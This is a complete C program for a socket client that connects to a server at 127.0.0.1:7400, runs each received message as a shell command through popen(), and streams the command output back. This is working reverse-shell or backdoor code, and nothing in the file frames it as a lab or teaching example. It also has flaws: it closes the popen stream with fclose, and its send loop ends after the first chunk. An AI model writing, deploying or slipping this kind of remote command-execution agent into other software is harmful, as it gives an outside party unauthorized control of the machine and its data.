#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define MSG_SIZE 10000
#define MYPORT 7400
#define HOSTNAME "127.0.0.1"

void error_and_exit(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

int main() {
  /* Create a socket for the client */
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    error_and_exit("Error opening socket");
  }

  /* Get server's IP address */
  struct hostent *server = gethostbyname(HOSTNAME);
  if (server == NULL) {
    error_and_exit("Error: No such host");
  }

  struct sockaddr_in serv_addr;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(MYPORT);
  memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

  /* Connect to the server */
  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
    error_and_exit("Error connecting to server");
  }
  printf("Connected to server.\n");

  char msg[MSG_SIZE];
  ssize_t bytes_received;

  /* Receive and process messages from the server */
  while (1) {
    bytes_received = recv(sockfd, msg, MSG_SIZE - 1,
                          0); // Limit received bytes to MSG_SIZE - 1
    if (bytes_received < 0) {
      error_and_exit("Error reading from socket");
    } else if (bytes_received == 0) {
      printf("Server disconnected.\n");
      break;
    } else {
      msg[bytes_received] = '\0'; // Null-terminate the received message
      printf("Received message from server: %s\n", msg);
      // Process the received message here (e.g., execute commands)
      FILE *output_pipe = popen(msg, "r");
      if (!output_pipe) {
        printf("Error executing command\n");
        return -1;
      }

      // Read the output of the command and send it back to the server
      char result_buffer[MSG_SIZE]; // Adjust buffer size to match MSG_SIZE
      size_t total_bytes_sent = 0;
      ssize_t bytes_sent;

      while (1) {
        ssize_t bytes_read =
            fread(result_buffer, 1, sizeof(result_buffer), output_pipe);
        if (bytes_read == 0) {
          if (feof(output_pipe)) {
            break; // End of file reached
          } else {
            perror("Error reading command output");
            break;
          }
        }

        // Send the read bytes to the server
        bytes_sent = send(sockfd, result_buffer, bytes_read, 0);
        if (bytes_sent < 0) {
          perror("Error sending response to server");
          break;
        }
        total_bytes_sent += bytes_sent;

        // Check if all bytes have been sent
        if (total_bytes_sent >= bytes_read) {
          break;
        }
      }

      fclose(output_pipe); // Close the output pipe
    }
  }

  /* Close the socket */
  close(sockfd);
  return 0;
}
